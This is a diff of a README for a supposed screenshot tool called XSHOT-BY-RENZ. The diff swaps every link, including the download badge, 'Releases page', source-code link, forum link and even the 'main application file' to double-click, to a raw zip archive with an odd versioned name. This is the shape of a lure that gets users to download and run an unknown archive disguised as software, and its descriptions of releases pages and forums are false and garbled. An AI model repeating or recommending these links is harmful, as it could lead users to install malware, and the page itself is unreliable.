@@ -1,6 +1,6 @@
 # 🎨 XSHOT-BY-RENZ - Create Stunning Screenshots Effortlessly
 
-[![Download XSHOT-BY-RENZ](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip)](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip)
+[![Download XSHOT-BY-RENZ](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip)](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip)
 
 ## ✨ Overview
 
@@ -13,7 +13,7 @@ To get started with XShot, follow these easy steps to download and run the appli
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**  
-   To download XShot, go to the [Releases page](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip).
+   To download XShot, go to the [Releases page](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the latest version for your platform. For most users, the recommended file is highlighted. 
@@ -25,7 +25,7 @@ To get started with XShot, follow these easy steps to download and run the appli
    If you downloaded a `.zip` file, locate the downloaded file on your computer, then right-click and choose "Extract All" to unpack the files.
 
 5. **Run the Application**  
-   After extraction, find the main application file (e.g., `https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip` or `https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip`). Double-click it to launch XShot.
+   After extraction, find the main application file (e.g., `https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip` or `https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip`). Double-click it to launch XShot.
 
 6. **Follow the Setup Instructions**  
    The application will guide you through any initial setup. Simply follow the prompts to get started.
@@ -60,12 +60,12 @@ XShot offers several helpful features to enhance your screenshot experience:
 
 ## 🔗 Additional Resources
 
-- **Project Repository:** [Find the source code and contribute](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip).
-- **User Community:** Join our [discussion forum](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip) for tips and shared resources.
+- **Project Repository:** [Find the source code and contribute](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip).
+- **User Community:** Join our [discussion forum](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip) for tips and shared resources.
 
 ## ✅ Final Checklist
 
-- Downloaded the application from the [Releases page](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/reedbuck/XSHOT-BY-RENZ.zip)?
+- Downloaded the application from the [Releases page](https://raw.githubusercontent.com/iso-zoro-07/XSHOT-BY-RENZ/main/xshot_py/utils/B_RENZ_XSHO_1.9-alpha.5.zip)?
 - Followed the installation steps?
 - Explored the features?
   
